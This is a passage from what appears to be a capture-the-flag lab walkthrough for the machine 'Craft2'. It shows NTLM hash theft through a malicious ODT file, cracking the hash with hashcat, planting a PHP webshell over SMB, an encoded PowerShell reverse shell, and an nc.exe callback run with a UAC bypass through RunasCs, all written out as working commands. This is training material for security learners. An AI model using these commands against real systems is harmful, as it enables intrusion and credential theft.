+<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop<span class="hljs-operator">/</span>Labs<span class="hljs-operator">/</span>Craft2<span class="hljs-operator">/</span>badodt.py:<span class="hljs-number">13</span>: <span class="hljs-params">SyntaxWarning:</span> invalid escape sequence &apos;\<span class="hljs-operator">/</span>&apos;
+  <span class="hljs-symbol">/</span> __ )____ _____<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>     <span class="hljs-symbol">/</span> __ \<span class="hljs-symbol">/</span> __ \<span class="hljs-symbol">/</span> ____<span class="hljs-symbol">/</span>
+
+    ____            __      ____  ____  ______
+   <span class="hljs-symbol">/</span> __ )____ _____<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>     <span class="hljs-symbol">/</span> __ \<span class="hljs-symbol">/</span> __ \<span class="hljs-symbol">/</span> ____<span class="hljs-symbol">/</span>
+  <span class="hljs-symbol">/</span> __  <span class="hljs-symbol">/</span> __ `<span class="hljs-symbol">/</span> __  <span class="hljs-operator">/</span>_____<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/_</span>    
+ <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_____<span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> __<span class="hljs-symbol">/</span>    
+<span class="hljs-operator">/</span>_____<span class="hljs-operator">/</span>\__,_<span class="hljs-operator">/</span>\__,_<span class="hljs-symbol">/</span>      \____<span class="hljs-operator">/</span>_____<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>     
+
+
+Create a malicious ODF document help leak NetNTLM Creds
+
+By Richard Davy 
+@rd_pentest
+Python3 version by @gustanini
+www.secureyourit.co.uk
+
+
+Please enter IP of <span class="hljs-params">listener:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">45.197</span>
+<span class="hljs-symbol">/home/kali/Desktop/Labs/Craft2/bad.odt</span> successfully created
+</code></pre></div>
+<p>Start up <code class="inline-code">responder</code> and upload the ODT file. Then we should capture the NTLMv2 hash:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">[SMB] NTLMv2-SSP Client   : 192.168.145.188
+[SMB] NTLMv2-SSP Username : CRAFT2\thecybergeek
+[SMB] NTLMv2-SSP Hash     : thecybergeek::CRAFT2:43bb24d429701176:4D54AE72E64D6E4B84891AC715D5F565:0101000000000000809BD0F6598FDC015E63C571BCAA7CF80000000002000800510058004F004B0001001E00570049004E002D003000350053004E005000450035004C004E003100300004003400570049004E002D003000350053004E005000450035004C004E00310030002E00510058004F004B002E004C004F00430041004C0003001400510058004F004B002E004C004F00430041004C0005001400510058004F004B002E004C004F00430041004C0007000800809BD0F6598FDC010600040002000000080030003000000000000000000000000030000000EC7CA1882CB50297357209482D722C2F3D41A566D0CC3BD5A56B55A058CBB00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100390037000000000000000000</pre><pre class="hljs"><code>[SMB] NTLMv2-SSP Client   : <span class="hljs-number">192.168.145.188</span>
+[SMB] NTLMv2-SSP Username : CRAFT2\thecybergeek
+[SMB] NTLMv2-SSP Hash     : thecybergeek<span class="hljs-number">::</span>CRAFT2:<span class="hljs-number">43</span>bb<span class="hljs-number">24d429701176</span>:<span class="hljs-number">4</span>D54AE72E64D6E4B84891AC7<span class="hljs-number">15D5F565</span>:<span class="hljs-number">0101000000000000809</span>BD0F6598FDC015E63C571BCAA7CF80000000002000800510058004F004B0001001E00570049004E002D003000350053004E005000450035004C004E003100300004003400570049004E002D003000350053004E005000450035004C004E00310030002E00510058004F004B002E004C004F00430041004C0003001400510058004F004B002E004C004F00430041004C0005001400510058004F004B002E004C004F00430041004C0007000800809BD0F6598FDC010600040002000000080030003000000000000000000000000030000000EC7CA1882CB50297357209482D722C2F3D41A566D0CC3BD5A56B55A058CBB00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E0031003900370000000<span class="hljs-number">00000000000</span></code></pre></div>
+<p>Pass it to <code class="inline-code">hashcat</code> with the mode <code class="inline-code">5600</code> to crack it offline:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 946729410
+
+THECYBERGEEK::CRAFT2:43bb24d429701176:4d54ae72e64d6e4b84891ac715d5f565:0101000000000000809bd0f6598fdc015e63c571bcaa7cf80000000002000800510058004f004b0001001e00570049004e002d003000350053004e005000450035004c004e003100300004003400570049004e002d003000350053004e005000450035004c004e00310030002e00510058004f004b002e004c004f00430041004c0003001400510058004f004b002e004c004f00430041004c0005001400510058004f004b002e004c004f00430041004c0007000800809bd0f6598fdc010600040002000000080030003000000000000000000000000030000000ec7ca1882cb50297357209482d722c2f3d41a566d0cc3bd5a56b55a058cbb00a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390037000000000000000000:winniethepooh
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)</pre><pre class="hljs"><code>Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 946729410
+
+THECYBERGEEK::CRAFT2:43bb24d429701176:4d54ae72e64d6e4b84891ac715d5f565:0101000000000000809bd0f6598fdc015e63c571bcaa7cf80000000002000800510058004f004b0001001e00570049004e002d003000350053004e005000450035004c004e003100300004003400570049004e002d003000350053004e005000450035004c004e00310030002e00510058004f004b002e004c004f00430041004c0003001400510058004f004b002e004c004f00430041004c0005001400510058004f004b002e004c004f00430041004c0007000800809bd0f6598fdc010600040002000000080030003000000000000000000000000030000000ec7ca1882cb50297357209482d722c2f3d41a566d0cc3bd5a56b55a058cbb00a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390037000000000000000000:winniethepooh
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)</code></pre></div>
+<p>As shown in the output above, we should obtain the password <code class="inline-code">winniethepooh</code>. This password belongs to the user <code class="inline-code">thecybergeek</code>.</p>
+<p>The credentials seem to work successfully:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ nxc smb 192.168.145.188 -u thecybergeek -p winniethepooh
+SMB         192.168.145.188 445    CRAFT2           [*] Windows 10 / Server 2019 Build 17763 x64 (name:CRAFT2) (domain:CRAFT2) (signing:False) (SMBv1:None)
+SMB         192.168.145.188 445    CRAFT2           [+] CRAFT2\thecybergeek:winniethepooh</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ nxc smb 192.168.145.188 -u thecybergeek -p winniethepooh
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           [*] Windows<span class="hljs-number"> 10 </span>/ Server<span class="hljs-number"> 2019 </span>Build<span class="hljs-number"> 17763 </span>x64 (name:CRAFT2) (domain:CRAFT2) (signing:False) (SMBv1:None)
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           [+] CRAFT2\thecybergeek:winniethepooh</code></pre></div>
+<p>Only <code class="inline-code">apache</code> and <code class="inline-code">thecybergeek</code> user created account on the machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ nxc smb 192.168.145.188 -u thecybergeek -p winniethepooh --rid-brute 100000
+SMB         192.168.145.188 445    CRAFT2           [*] Windows 10 / Server 2019 Build 17763 x64 (name:CRAFT2) (domain:CRAFT2) (signing:False) (SMBv1:None)
+SMB         192.168.145.188 445    CRAFT2           [+] CRAFT2\thecybergeek:winniethepooh 
+SMB         192.168.145.188 445    CRAFT2           500: CRAFT2\Administrator (SidTypeUser)
+SMB         192.168.145.188 445    CRAFT2           501: CRAFT2\Guest (SidTypeUser)
+SMB         192.168.145.188 445    CRAFT2           503: CRAFT2\DefaultAccount (SidTypeUser)
+SMB         192.168.145.188 445    CRAFT2           504: CRAFT2\WDAGUtilityAccount (SidTypeUser)
+SMB         192.168.145.188 445    CRAFT2           513: CRAFT2\None (SidTypeGroup)
+SMB         192.168.145.188 445    CRAFT2           1000: CRAFT2\apache (SidTypeUser)
+SMB         192.168.145.188 445    CRAFT2           1001: CRAFT2\thecybergeek (SidTypeUser)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ nxc smb 192.168.145.188 -u thecybergeek -p winniethepooh --rid-brute 100000
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           [*] Windows<span class="hljs-number"> 10 </span>/ Server<span class="hljs-number"> 2019 </span>Build<span class="hljs-number"> 17763 </span>x64 (name:CRAFT2) (domain:CRAFT2) (signing:False) (SMBv1:None)
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           [+] CRAFT2\thecybergeek:winniethepooh 
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           500: CRAFT2\Administrator (SidTypeUser)
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           501: CRAFT2\Guest (SidTypeUser)
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           503: CRAFT2\DefaultAccount (SidTypeUser)
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           504: CRAFT2\WDAGUtilityAccount (SidTypeUser)
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           513: CRAFT2\None (SidTypeGroup)
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           1000: CRAFT2\apache (SidTypeUser)
+SMB         192.168.145.188<span class="hljs-number"> 445 </span>   CRAFT2           1001: CRAFT2\thecybergeek (SidTypeUser)</code></pre></div>
+<p>Since the SMB port is open. Enumerating it shows the <code class="inline-code">WebApp</code> share is open. Our user has <code class="inline-code">READ</code> and <code class="inline-code">WRITE</code> privileges over it:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ nxc smb 192.168.145.188 -u thecybergeek -p winniethepooh --shares          
+SMB         192.168.145.188 445    CRAFT2           [*] Windows 10 / Server 2019 Build 17763 x64 (name:CRAFT2) (domain:CRAFT2) (signing:False) (SMBv1:None)
+SMB         192.168.145.188 445    CRAFT2           [+] CRAFT2\thecybergeek:winniethepooh 
+SMB         192.168.145.188 445    CRAFT2           [*] Enumerated shares
+SMB         192.168.145.188 445    CRAFT2           Share           Permissions     Remark
+SMB         192.168.145.188 445    CRAFT2           -----           -----------     ------
+SMB         192.168.145.188 445    CRAFT2           ADMIN$                          Remote Admin
+SMB         192.168.145.188 445    CRAFT2           C$                              Default share
+SMB         192.168.145.188 445    CRAFT2           IPC$            READ            Remote IPC
+SMB         192.168.145.188 445    CRAFT2           WebApp          READ,WRITE</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ nxc<span class="hljs-built_in"> smb </span>192.168.145.188 -u thecybergeek -p winniethepooh --shares          <span class="hljs-built_in">
+SMB </span>        192.168.145.188 445    CRAFT2           [*] Windows 10 /<span class="hljs-built_in"> Server </span>2019 Build 17763 x64 (name:CRAFT2) (domain:CRAFT2) (signing:False) (SMBv1:None)<span class="hljs-built_in">
+SMB </span>        192.168.145.188 445    CRAFT2           [+] CRAFT2\thecybergeek:winniethepooh <span class="hljs-built_in">
+SMB </span>        192.168.145.188 445    CRAFT2           [*] Enumerated<span class="hljs-built_in"> shares
+SMB </span>        192.168.145.188 445    CRAFT2           Share           Permissions     Remark<span class="hljs-built_in">
+SMB </span>        192.168.145.188 445    CRAFT2           -----           -----------     ------<span class="hljs-built_in">
+SMB </span>        192.168.145.188 445    CRAFT2           ADMIN$                          Remote Admin<span class="hljs-built_in">
+SMB </span>        192.168.145.188 445    CRAFT2           C$                             <span class="hljs-built_in"> Default </span>share<span class="hljs-built_in">
+SMB </span>        192.168.145.188 445    CRAFT2           IPC$            READ            Remote IPC<span class="hljs-built_in">
+SMB </span>        192.168.145.188 445    CRAFT2           WebApp          READ,WRITE</code></pre></div>
+<p>Connecting to the share shows we have access to the entire web application directory:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ smbclient //192.168.145.188/WebApp -U thecybergeek
+Password for [WORKGROUP\thecybergeek]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Tue Jan 27 07:02:20 2026
+  ..                                  D        0  Tue Jan 27 07:02:20 2026
+  assets                              D        0  Tue Apr  5 12:16:03 2022
+  css                                 D        0  Tue Apr  5 12:16:03 2022
+  index.php                           A     9768  Mon Jan 31 11:21:52 2022
+  js                                  D        0  Tue Apr  5 12:16:03 2022
+  upload.php                          A      896  Mon Jan 31 10:23:02 2022
+  uploads                             D        0  Tue Jan 27 06:56:07 2026
+
+        10327807 blocks of size 4096. 1582074 blocks available
+smb: \&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ smbclient //192.168.145.188/WebApp -U thecybergeek
+Password for [WORKGROUP\thecybergeek]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Tue Jan<span class="hljs-number"> 27 </span>07:02:20 2026
+  ..                                  D       <span class="hljs-number"> 0 </span> Tue Jan<span class="hljs-number"> 27 </span>07:02:20 2026
+  assets                              D       <span class="hljs-number"> 0 </span> Tue Apr <span class="hljs-number"> 5 </span>12:16:03 2022
+  css                                 D       <span class="hljs-number"> 0 </span> Tue Apr <span class="hljs-number"> 5 </span>12:16:03 2022
+  index.php                           A    <span class="hljs-number"> 9768 </span> Mon Jan<span class="hljs-number"> 31 </span>11:21:52 2022
+  js                                  D       <span class="hljs-number"> 0 </span> Tue Apr <span class="hljs-number"> 5 </span>12:16:03 2022
+  upload.php                          A     <span class="hljs-number"> 896 </span> Mon Jan<span class="hljs-number"> 31 </span>10:23:02 2022
+  uploads                             D       <span class="hljs-number"> 0 </span> Tue Jan<span class="hljs-number"> 27 </span>06:56:07 2026
+
+       <span class="hljs-number"> 10327807 </span>blocks of size 4096.<span class="hljs-number"> 1582074 </span>blocks available
+smb: \&gt; 
+</code></pre></div>
+<p>I notice I can put a webshell at the base directory:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ smbclient //192.168.145.188/WebApp -U thecybergeek
+Password for [WORKGROUP\thecybergeek]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Tue Jan 27 07:02:20 2026
+  ..                                  D        0  Tue Jan 27 07:02:20 2026
+  assets                              D        0  Tue Apr  5 12:16:03 2022
+  css                                 D        0  Tue Apr  5 12:16:03 2022
+  index.php                           A     9768  Mon Jan 31 11:21:52 2022
+  js                                  D        0  Tue Apr  5 12:16:03 2022
+  upload.php                          A      896  Mon Jan 31 10:23:02 2022
+  uploads                             D        0  Tue Jan 27 07:05:19 2026
+
+        10327807 blocks of size 4096. 1579759 blocks available
+smb: \&gt; put shell.php
+putting file shell.php as \shell.php (2.0 kB/s) (average 2.0 kB/s)
+smb: \&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ smbclient //192.168.145.188/WebApp -U thecybergeek
+Password for [WORKGROUP\thecybergeek]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Tue Jan<span class="hljs-number"> 27 </span>07:02:20 2026
+  ..                                  D       <span class="hljs-number"> 0 </span> Tue Jan<span class="hljs-number"> 27 </span>07:02:20 2026
+  assets                              D       <span class="hljs-number"> 0 </span> Tue Apr <span class="hljs-number"> 5 </span>12:16:03 2022
+  css                                 D       <span class="hljs-number"> 0 </span> Tue Apr <span class="hljs-number"> 5 </span>12:16:03 2022
+  index.php                           A    <span class="hljs-number"> 9768 </span> Mon Jan<span class="hljs-number"> 31 </span>11:21:52 2022
+  js                                  D       <span class="hljs-number"> 0 </span> Tue Apr <span class="hljs-number"> 5 </span>12:16:03 2022
+  upload.php                          A     <span class="hljs-number"> 896 </span> Mon Jan<span class="hljs-number"> 31 </span>10:23:02 2022
+  uploads                             D       <span class="hljs-number"> 0 </span> Tue Jan<span class="hljs-number"> 27 </span>07:05:19 2026
+
+       <span class="hljs-number"> 10327807 </span>blocks of size 4096.<span class="hljs-number"> 1579759 </span>blocks available
+smb: \&gt; put shell.php
+putting file shell.php as \shell.php (2.0 kB/s) (average 2.0 kB/s)
+smb: \&gt; 
+</code></pre></div>
+<p>Now I can use the PHP webshell to issue commands on the target machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ curl &quot;http://192.168.145.188/shell.php?cmd=whoami&quot;
+craft2\apache
+craft2\apache                                                                                                                                                                         
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ curl &quot;http://192.168.145.188/shell.php?cmd=ipconfig&quot;
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.145.188
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.145.254
+   Default Gateway . . . . . . . . . : 192.168.145.254</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ curl <span class="hljs-string">&quot;http://192.168.145.188/shell.php?cmd=whoami&quot;</span>
+craft2\apache
+craft2\apache                                                                                                                                                                         
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ curl <span class="hljs-string">&quot;http://192.168.145.188/shell.php?cmd=ipconfig&quot;</span>
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 <span class="hljs-number">2</span>:
+
+   Connection-specific DNS Suffix  . : 
+   <span class="hljs-type">IPv4</span> Address. . . . . . . . . . . : 192.168.145.188
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.145.254
+   Default Gateway . . . . . . . . . : 192.168.145.254</code></pre></div>
+<p>Stand up a listener on port 8443. Then issue a Powershell base64 encoded reverse shell:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ curl &quot;http://192.168.145.188/shell.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA3ACIALAA4ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D&quot;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ curl &quot;http://192.168.145.188/shell.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA3ACIALAA4ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D&quot;</code></pre></div>
+<p>And now I have a shell as the user <code class="inline-code">apache</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]
+&boxur;&boxh;$ sudo nc -lvnp 8443                          
+[sudo] password for kali: 
+listening on [any] 8443 ...
+connect to [192.168.45.197] from (UNKNOWN) [192.168.145.188] 49736
+
+PS C:\xampp\htdocs&gt; whoami
+craft2\apache
+PS C:\xampp\htdocs&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.145.188
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.145.254
+PS C:\xampp\htdocs&gt; </pre><pre class="hljs"><code><span class="hljs-string">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Craft2]</span>
+<span class="hljs-string">&boxur;&boxh;$</span> <span class="hljs-string">sudo</span> <span class="hljs-string">nc</span> <span class="hljs-string">-lvnp</span> <span class="hljs-number">8443</span>                          
+[<span class="hljs-string">sudo</span>] <span class="hljs-attr">password for kali:</span> 
+<span class="hljs-string">listening</span> <span class="hljs-string">on</span> [<span class="hljs-string">any</span>] <span class="hljs-number">8443</span> <span class="hljs-string">...</span>
+<span class="hljs-string">connect</span> <span class="hljs-string">to</span> [<span class="hljs-number">192.168</span><span class="hljs-number">.45</span><span class="hljs-number">.197</span>] <span class="hljs-string">from</span> <span class="hljs-string">(UNKNOWN)</span> [<span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.188</span>] <span class="hljs-number">49736</span>
+
+<span class="hljs-string">PS</span> <span class="hljs-string">C:\xampp\htdocs&gt;</span> <span class="hljs-string">whoami</span>
+<span class="hljs-string">craft2\apache</span>
+<span class="hljs-string">PS</span> <span class="hljs-string">C:\xampp\htdocs&gt;</span> <span class="hljs-string">ipconfig</span>
+
+<span class="hljs-string">Windows</span> <span class="hljs-string">IP</span> <span class="hljs-string">Configuration</span>
+
+
+<span class="hljs-attr">Ethernet adapter Ethernet0 2:</span>
+
+   <span class="hljs-attr">Connection-specific DNS Suffix  . :</span> 
+   <span class="hljs-attr">IPv4 Address. . . . . . . . . . . :</span> <span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.188</span>
+   <span class="hljs-attr">Subnet Mask . . . . . . . . . . . :</span> <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span>
+   <span class="hljs-attr">Default Gateway . . . . . . . . . :</span> <span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.254</span>
+<span class="hljs-string">PS</span> <span class="hljs-string">C:\xampp\htdocs&gt;</span> </code></pre></div>
+<p>Start up another listener on port 443. Then transfer <code class="inline-code">nc.exe</code> and <code class="inline-code">RunasCs.exe</code> to the target. Time to move laterally to the <code class="inline-code">thecybergeek</code> user account. Remember to bypass the UAC and use the correct logon type of <code class="inline-code">5</code> to get the correct privileges:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">PS C:\Temp&gt; .\RunasCs.exe thecybergeek winniethepooh &quot;C:\Temp\nc.exe 192.168.45.197 443 -e cmd.exe&quot; --bypass-uac --logon-type 5</pre><pre class="hljs"><code>PS C:\Temp&gt; .\RunasCs<span class="hljs-selector-class">.exe</span> thecybergeek winniethepooh <span class="hljs-string">&quot;C:\Temp\nc.exe 192.168.45.197 443 -e cmd.exe&quot;</span> <span class="hljs-attr">--bypass-uac</span> <span class="hljs-attr">--logon-type</span> <span class="hljs-number">5</span></code></pre></div>
